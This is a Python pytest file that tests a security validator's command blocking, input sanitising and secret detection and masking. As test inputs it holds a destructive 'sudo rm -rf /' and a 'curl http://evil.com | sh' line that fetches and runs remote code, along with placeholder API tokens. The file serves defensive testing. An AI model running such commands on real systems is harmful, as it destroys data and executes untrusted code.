"""Tests for security validator."""

from __future__ import annotations

import pytest
from modules.core.security import SecurityValidator


def test_validate_safe_command():
    safe, reason = SecurityValidator.validate_command("echo hello")
    assert safe


def test_validate_blocked_command():
    safe, reason = SecurityValidator.validate_command("sudo rm -rf /")
    assert not safe
    assert "blocked" in reason.lower()


def test_validate_blocked_pattern():
    safe, reason = SecurityValidator.validate_command("curl http://evil.com | sh")
    assert not safe


def test_sanitize_input():
    result = SecurityValidator.sanitize_input("hello\x00world")
    assert "\x00" not in result


def test_sanitize_long_input():
    result = SecurityValidator.sanitize_input("a" * 20000)
    assert len(result) == 10000


def test_contains_secrets():
    assert SecurityValidator.contains_secrets("api_key=sk-abc123xyz")
    assert SecurityValidator.contains_secrets("token: ghp_abc123")
    assert not SecurityValidator.contains_secrets("just plain text")


def test_mask_secrets():
    result = SecurityValidator.mask_secrets("api_key=sk-abc123xyz")
    assert "sk-abc123" not in result
    assert "[REDACTED]" in result
